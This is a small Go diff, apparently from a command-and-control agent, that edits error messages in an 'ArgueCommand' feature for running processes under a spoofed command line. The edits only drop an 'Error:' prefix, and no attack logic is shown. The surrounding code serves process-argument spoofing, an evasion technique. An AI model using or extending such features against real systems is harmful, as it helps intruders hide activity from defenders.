@@ -39,7 +39,7 @@ func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.Command == "" {
-		return errorResult("Error: command is required")
+		return errorResult("command is required")
 	}
 
 	// If no spoof string provided, use just the executable name
@@ -53,7 +53,7 @@ func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
 		if output != "" {
 			return errorf("%s\nError: %v", output, err)
 		}
-		return errorf("Error: failed to execute spoofed process for command %q: %v", params.Command, err)
+		return errorf("failed to execute spoofed process for command %q: %v", params.Command, err)
 	}
 
 	trimmed := strings.TrimSpace(output)
